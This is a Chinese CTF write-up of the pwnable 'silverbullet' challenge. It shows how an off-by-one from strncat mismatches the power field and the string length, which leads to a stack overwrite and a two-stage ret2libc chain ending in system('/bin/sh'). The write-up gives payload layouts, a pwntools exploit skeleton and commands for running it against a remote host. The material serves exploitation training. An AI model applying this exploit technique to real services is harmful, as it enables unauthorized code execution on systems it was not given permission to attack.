# Speedrun：pwnable_silverbullet（逻辑 Bug → 栈越界 → ret2libc）

> 题型：**逻辑 bug 造成的栈越界**（不是普通溢出）+ ret2libc 两轮
> 目标：`strncat` 把 NUL 写进 `power` 低字节 → `power` 与 `strlen(desc)` 失配 →
> 下一次 `power_up` 从 `ebp-0x3` 越界写 `0x2f` 字节 → 覆盖 `saved ebp/ret`
> 关键：`desc[0x30]` 是 `power`、溢出起点 `ebp-0x3`、整条链不能含 `\x00`

---

## 0. 一句话结论

```text
32 位 i386、No PIE、NX、not stripped；menu 四选项

struct bullet { char desc[0x30]; unsigned power; };   @ ebp-0x34
  desc  = ebp-0x34 .. ebp-0x5
  power = ebp-0x4
werewolf { int hp = 0x7fffffff; char *name = "Gin"; }  @ ebp-0x3c / ebp-0x38

create_bullet: read_input(desc, 0x30); power = strlen(desc);
power_up:      if (power > 0x2f) return;
               n = 0x30 - power;
               read_input(tmp, n); strncat(desc, tmp, n);
               power = power + strlen(tmp);
beat:          hp -= power; if (hp <= 0)  "<Oh ! You win !!>" -> main return

Bug（三步）：
1) create 发 47 字节 + '\n'  -> strlen(desc)=0x2f, power=0x2f
2) power_up 发 1 字节（不带换行）-> strncat 的 NUL 落在 desc[0x30]，
   power 的 LSB 被清零 -> power 变成 1，但 strlen(desc) 已经变成 0x31
3) power_up 第二次：n = 0x30-1 = 0x2f，strncat 从 desc+0x31 = ebp-0x3
   开始写 0x2f 字节 -> 直接吃掉 saved ebp / saved ret

溢出布局（0x2f 字节，全部不能是 0x00）：
  [0..2]   b"\xff"*3                  -> power 变 0xffffff30 > hp，保证 beat 获胜
  [3..6]   p32(saved_ebp)             -> ebp+0x0
  [7..10]  p32(round1_ret)            -> ebp+0x4  = 劫持点
  ...

round 1: puts(read@got) -> 回 main      （leak libc）
round 2: system("/bin/sh")              （第二遍同样的三步）
```

---

## 1. 30 秒定性质

```bash
cd '/home/yfhd5/Pwn_Writeups/ret2libc'

file pwnable_silverbullet
strings -tx pwnable_silverbullet | grep -Ei 'bullet|werewolf|power|win'
objdump -d -M intel pwnable_silverbullet | sed -n '/<main>:/,/^$/p'
objdump -d -M intel pwnable_silverbullet | sed -n '/<power_up>:/,/^$/p'
objdump -d -M intel pwnable_silverbullet | sed -n '/<beat>:/,/^$/p'
```

关键输出：

```text
ELF 32-bit LSB executable, Intel i386, dynamically linked, not stripped

main:
  memset(&bullet, 0, 0x30);            <- 只清 0x30 字节（power 在 0x30，恰好在边界）
  hp = 0x7fffffff; name = "Gin";
  loop { menu(); switch (read_int()) { 1: create; 2: power_up; 3: beat; 4: exit } }
power_up:
  if (bullet->power > 0x2f) "You can't power up any more !"
  n = 0x30 - bullet->power
  read_input(tmp, n); strncat(bullet, tmp, n); bullet->power += strlen(tmp)
beat:
  hp -= bullet->power;  if (hp <= 0) "Oh ! You win !!" -> return 1
```

读法：

| 观察 | 结论 |
| --- | --- |
| `memset(&bullet, 0, 0x30)` | `power` 正好在 `0x30`，是“边界外的第一个字段” —— 漏洞就指它 |
| `strncat(desc, tmp, n)` | 会在 `desc+strlen(desc)` 处**追加 NUL**，这个 NUL 的位置由 `strlen` 决定，而长度检查用的是 `power` |
| `power` 与 `strlen(desc)` 可以失配 | 失配后 `n` 变大、写入起点也变大 → 越界 |
| `beat` 用 `hp -= power` | `power` 是 `unsigned`，灌成 `0xffffff30` 就能“赢” |
| 只有 `exit(0)` 和 `main` 的 `return` | 想触发 ROP 必须让 `beat` 返回 1，走 `return` |
| 32 位 + No PIE | 二进制内地址写死；libc 需要 leak |

---

## 2. 关键逆向

### 2.1 结构体就在 main 的栈帧里

```asm
08048954 <main>:
  8048957: sub    esp,0x3c
  8048966: push   0x30
  8048968: push   0x0
  804896a: lea    eax,[ebp-0x34]       # &bullet
  804896e: call   memset               # memset(&bullet, 0, 0x30)  <-- 只清 0x30
  8048976: mov    DWORD PTR [ebp-0x3c],0x7fffffff   # werewolf.hp
  804897d: mov    DWORD PTR [ebp-0x38],0x8048d06   # werewolf.name = "Gin"
```

```text
ebp-0x3c  werewolf.hp      = 0x7fffffff
ebp-0x38  werewolf.name    -> "Gin"
ebp-0x34  bullet.desc[0x30]
ebp-0x04  bullet.power      <-- 溢出就落在这里
ebp+0x00  saved ebp
ebp+0x04  saved ret
```

### 2.2 create → power = strlen(desc)

```asm
080487fb <create_bullet>:
  8048831: push   0x30
  8048833: push   eax                  # &bullet
  8048834: call   read_input           # read(0, bullet, 0x30)
  804883c: push   &bullet
  8048840: call   strlen
  804885e: mov    edx,[ebp-0x4]        # strlen
  8048861: mov    [eax+0x30],edx       # bullet->power = strlen(desc)
```

发 47 个 `A` + `'\n'`：`read` 拿到 48 字节，末尾 `'\n'` 被 `read_input` 换成 `\0`，
于是 `strlen(desc) = 0x2f`、`power = 0x2f`。

### 2.3 power_up 的两次拼接 —— 失配的产生

```asm
08048874 <power_up>:
  80488b0: mov    eax,[eax+0x30]       # power
  80488b3: cmp    eax,0x2f
  80488b6: ja     "You can't power up any more !"
  80488cf: mov    edx,0x30
  80488d4: sub    edx,eax              # n = 0x30 - power
  80488d8: push   n ; lea eax,[ebp-0x34]; push eax
  80488dd: call   read_input           # read(0, tmp, n)
  80488f5: push   n ; push tmp ; push &bullet
  80488fb: call   strncat              # strncat(desc, tmp, n)  <-- 追加 NUL
  8048903: push   tmp ; call strlen
  804892c: mov    [eax+0x30],edx       # power = power + strlen(tmp)
```

第一次 `power_up`（`power = 0x2f`，`n = 1`，只发 1 字节 `'X'`）：

```text
strncat 把 'X' 放在 desc[0x2f]，NUL 放在 desc[0x30] = power 的 LSB
-> power 变成 0x00000000，再 power += strlen("X") -> power = 1
-> 但 desc[0x30] 现在是 0x01，desc[0x31] 才是 0x00
-> strlen(desc) = 0x31
```

第二次 `power_up`：`power = 1` 通过检查，`n = 0x30 - 1 = 0x2f`，
而 `strncat` 从 `desc + strlen(desc) = desc + 0x31 = ebp-0x3` 开始写 —— **越界 0x2f 字节**。

### 2.4 为什么要先灌 3 个 `\xff`

越界写从 `ebp-0x3` 开始，所以：

```text
payload[0..2]  -> ebp-0x3 / ebp-0x2 / ebp-0x1   = power 的高 3 字节
payload[3..6]  -> ebp+0x0                       = saved ebp
payload[7..10] -> ebp+0x4                       = saved ret  <-- 劫持点
```

`power` 原有值 1（LSB = 0x01），高 3 字节被写成 `ff ff ff`：

```text
power = 0xffffff01 + strlen(payload) = 0xffffff30   (0x2f 字节，无 NUL)
beat: hp(0x7fffffff) - 0xffffff30 = 0x800000cf      (signed < 0) -> "Oh ! You win !!"
```

`beat` 返回 1 → `main` 走 `leave; ret` → 我们的链开始执行。

### 2.5 两轮 ROP

```python
# round 1: puts(read@got) + 回 main
b"\xff"*3 + p32(0x01010101) + p32(PUTS_PLT) + p32(MAIN) + p32(READ_GOT)

# round 2: system("/bin/sh")
b"\xff"*3 + p32(0x01010101) + p32(system) + p32(0x01010101) + p32(binsh)
```

地址表：

```text
read@plt  = 0x8048490    puts@plt = 0x80484A8
read@got  = 0x804AFD0    main     = 0x8048954
pop esi/edi/ebp; ret = 0x8048A79（本例没用上，直接 system(arg) 就够）
```

- `cdecl` 细节：`ret` 到 `puts@plt` 时，`[esp]` 是 `puts` 的返回地址（`MAIN`），
  `[esp+4]` 才是参数（`READ_GOT`）。这也是为什么链里 `PUTS_PLT` 后面紧跟 `MAIN`。
- **不要 leak `puts@got`**：本机 libc 里 `puts` 的地址最低字节是 `0x00`，
  `puts` 会直接打印空行。实测对照：

```text
puts(0x8048d0a)   -> b'\nGive me more power !!\n+++...'   链本身没问题
puts(puts@got)    -> b'\n\n+++...'                        空！首字节是 0x00
puts(read@got)    -> b'\n\xc0\x85\xdb\xf7\n+++...'        改用这个
```

---

## 3. 交互脚本骨架

```python
MENU = b"Your choice :"
DESC_PROMPT = b"Give me your description of bullet :"
UP_PROMPT = b"Give me your another description of bullet :"

def build_overflow(dwords):
    body = b"\xff\xff\xff" + b"".join(p32(x) for x in dwords)
    body = body.ljust(0x2F, b"A")
    assert b"\x00" not in body          # strncat 遇到 NUL 就停
    return body

def prepare(p):
    p.sendlineafter(MENU, b"1")
    p.sendafter(DESC_PROMPT, b"A" * 0x2F + b"\n")
    p.sendlineafter(MENU, b"2")
    p.sendafter(UP_PROMPT, b"X")        # 1 字节，不能带换行

def fire(p, payload):
    p.sendlineafter(MENU, b"2")
    p.sendafter(UP_PROMPT, payload)
    p.sendlineafter(MENU, b"3")         # "Oh ! You win !!" 才会 return
```

完整可运行版本见 `19_pwnable_silverbullet_exp.py`。

---

## 4. 本地验证

32 位二进制没有 `/lib/ld-linux.so.2` 时要用 i386 loader：

```bash
cd '/home/yfhd5/Pwn_Writeups/ret2libc'

echo 'flag{SILVER_LOCAL}' > flag.txt
I386_LD=/tmp/libc32/root/usr/lib/i386-linux-gnu/ld-linux.so.2 \
I386_LIBPATH=/tmp/libc32/root/usr/lib/i386-linux-gnu \
python 19_pwnable_silverbullet_exp.py LOCAL
rm -f flag.txt
```

正确输出：

```text
[+] read = 0xf7e695c0, libc = 0xf7d4b000, system = 0xf7d9ecc0
>----------- Werewolf -----------<
 + NAME : Gin
 + HP : 2147483647
>--------------------------------<
Try to beat it .....
Oh ! You win !!
__PWNED__
flag{SILVER_LOCAL}

[+] GOT THE FLAG: flag{SILVER_LOCAL}
```

远程：

```bash
LIBC=./libc.so.6 HOST=target.example.com PORT=9999 \
python 19_pwnable_silverbullet_exp.py

# TLS 平台（CTF² 等）额外加 SSL=1
SSL=1 LIBC=./libc.so.6 HOST=target.example.com PORT=9999 \
python 19_pwnable_silverbullet_exp.py
```

---

## 5. 交互坑

1. **溢出起点是 `ebp-0x3`，不是 `ebp-0x4`**
   第一次 `power_up` 把 `power = 1` 写回 `desc[0x30]`，`strlen(desc)` 因此变成 `0x31`。
   按 `ebp-0x4` 对齐会让整条链错位 1 字节 → 直接 SIGSEGV。

2. **整条 payload 不能含 `\x00`**
   `strncat` 以 NUL 结束，链里只要出现 `0x00` 就会被截断：
   - `saved ebp` 用 `0x01010101` 这种脏值；
   - `system` / `binsh` 地址由 libc 决定，偶尔某字节是 `0x00`，脚本断言失败后重连即可。

3. **第一次 `power_up` 只发 1 字节且不带换行**
   `read_input(tmp, 1)` 只读 1 字节；多发会把 `\n` 留在缓冲区，被下一次 `read` 吃掉，
   导致第二次拼接的 payload 整体错位。

4. **必须用 `3`（beat）触发 `return`，不能用 `4`**
   `4` 走 `exit(0)`，根本不 `ret`，链再完美也不会执行。
   而 `beat` 只有在 `hp - power <= 0` 时才返回 1 → 所以要先灌 `0xffffff30`。

5. **不要 leak `puts@got`**
   本机 libc 的 `puts` 最低字节是 `0x00`，`puts` 打印空行，看起来像“leak 失败”。
   换 `read@got` 或 `printf@got`。

6. **`memset` 只清 0x30 字节**
   这正是漏洞的根源：`power` 在 `0x30`，是“结构体外面的第一个字段”。

7. **32 位环境**
   没有 i386 loader 时用 `I386_LD` / `I386_LIBPATH`；
   远程要保证 `LIBC` 与目标一致，脚本会检查 `libc_base & 0xfff == 0`。

---

## 6. 2 分钟速通时间线

| 时间 | 动作 |
| --- | --- |
| 0:00–0:20 | `file` + `nm`：32 位、No PIE、not stripped，函数名 `create_bullet` / `power_up` / `beat` 全在 |
| 0:20–0:45 | 看 `main`：`memset(&bullet,0,0x30)`，`hp=0x7fffffff`，menu 循环 |
| 0:45–1:10 | 看 `power_up`：`n = 0x30 - power`，`strncat(desc,tmp,n)`，`power += strlen(tmp)` |
| 1:10–1:25 | 找到 bug：`strncat` 的 NUL 落进 `desc[0x30]`=power，造成 `power` 与 `strlen` 失配 |
| 1:25–1:40 | 设计三步：47 字节 create → 1 字节 power_up → 0x2f 字节越界 |
| 1:40–1:55 | 3 个 `\xff` 让 `power=0xffffff30`，`beat` 获胜触发 `main` 的 `ret` |
| 1:55–2:10 | round1 leak `read@got` 回 `main`；round2 `system("/bin/sh")` |
| 2:10–2:20 | 本地 i386 loader 验证 `__PWNED__`，远程 `cat flag*` |

---

## 7. 题型识别卡

```text
menu 程序 + 结构体放在栈上 + 长度检查用 power、写入位置用 strlen(desc)
+ 拼接函数是 strncat（会自动补 NUL）
= 逻辑 bug 型栈越界：让 power 与 strlen 失配，再用 strncat 越界覆盖返回地址
```

一句话：**`strncat` 的 NUL 把 `power` 打回 1、把 `strlen(desc)` 顶到 0x31，第二次拼接就从 `ebp-0x3` 开始越界；3 个 `\xff` 让 `beat` 判定获胜，`main` 才会 `ret`。**

